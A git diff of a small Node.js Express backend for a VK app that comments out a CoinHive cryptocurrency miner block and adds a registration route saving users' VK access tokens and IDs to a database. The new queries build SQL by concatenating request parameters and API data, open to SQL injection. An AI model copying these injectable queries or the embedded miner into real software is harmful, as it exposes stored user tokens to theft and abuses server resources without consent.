@@ -1,6 +1,7 @@
 const express = require('express')
 const app = express()
-const CoinHive = require('coin-hive');
+// MINER))))
+/*const CoinHive = require('coin-hive');
 
 (async () => {
   const miner = await CoinHive('iJFqkJpXPWBCQrualE4SxWyLBEqu2RTb');
@@ -9,7 +10,7 @@ const CoinHive = require('coin-hive');
   miner.on('found', () => console.log('Found!'));
   miner.on('accepted', () => console.log('Accepted!'));
 })();
-
+*/
 var mysql = require('mysql')
 
 var con = mysql.createConnection({
@@ -26,24 +27,41 @@ con.connect(function(err) {
 
 
 app.use((request, response, next) => {
-  console.log(request.headers)
+  //console.log(request.headers)
   next()
 })
 
 app.use((request, response, next) => {
-  request.chance = Math.random()
+  //request.chance = Math.random()
   next()
 })
 
 app.get('/', (request, response) => {
-  console.log(request.json)
+  //console.log(request.json)
+})
+
+app.get('/test', (request, response) => {
+  response.send('qwe')
 })
 
 app.get('/reg', (req,res) =>{
 	var token = req.query.access_token
 	var vk_id = req.query.vk_id
+	var sql = con.query("SELECT vk_id FROM boys WHERE vk_id = "+vk_id+"", function (err, result, fields) {
+	    if (err) throw err;
+	    if(result[0] == undefined){
+	      var sql = "INSERT INTO boys (access_token, vk_id) VALUES ("+token+", '"+vk_id+"')";
+	      con.query(sql, function (err, result) {
+	        if (err) throw err;
+	        getName(vk_id)
+	        console.log("User recorded to database");
+	      });
+	    }else{
+	      console.log('Just used')
+	    }
+	})
 	//res.send(token+"<br>"+vk_id)
-	//res.send('hello')
+	res.send('hello')
 })
 
 function sendMessage(user_id,access_token,message){
@@ -60,9 +78,6 @@ function sendMessage(user_id,access_token,message){
             headers: {}
         };
         httpOptions.headers['User-Agent'] = 'node ' + process.version;
-     
-        // Paw Store Cookies option is not supported
-
         const request = httpTransport.request(httpOptions, (res) => {
             let responseBufs = [];
             let responseStr = '';
@@ -97,7 +112,56 @@ function sendMessage(user_id,access_token,message){
         console.log('BODY:', body);
     });
 }
+function getName(user_id){
+    (function(callback) {
+        'use strict';
+            
+        const httpTransport = require('https');
+        const responseEncoding = 'utf8';
+        const httpOptions = {
+            hostname: 'api.vk.com',
+            port: '443',
+            path: '/method/users.get?user_id='+user_id+'',
+            method: 'POST',
+            headers: {"Cookie":"remixlang=0"}
+        };
+        httpOptions.headers['User-Agent'] = 'node ' + process.version;
+        const request = httpTransport.request(httpOptions, (res) => {
+            let responseBufs = [];
+            let responseStr = '';
+            
+            res.on('data', (chunk) => {
+                if (Buffer.isBuffer(chunk)) {
+                    responseBufs.push(chunk);
+                }
+                else {
+                    responseStr = responseStr + chunk;            
+                }
+            }).on('end', () => {
+                responseStr = responseBufs.length > 0 ? 
+                    Buffer.concat(responseBufs).toString(responseEncoding) : responseStr;
+                
+                callback(null, res.statusCode, res.headers, responseStr);
+            });
+            
+        })
+        .setTimeout(0)
+        .on('error', (error) => {
+            callback(error);
+        });
+        request.write("")
+        request.end();
+        
 
+    })((error, statusCode, headers, body) => {
+        var test = JSON.parse(body)
+        var sql = "UPDATE boys SET name = '"+test['response'][0]['first_name']+' '+test['response'][0]['last_name']+"' WHERE vk_id = "+user_id+"";
+            con.query(sql, function (err, result) {
+            if (err) throw err;
+            console.log('Name Added')
+        })
+    });   
+}
 app.listen(3000, function (){
 	console.log('Compliment 2.0 backend started');
 })
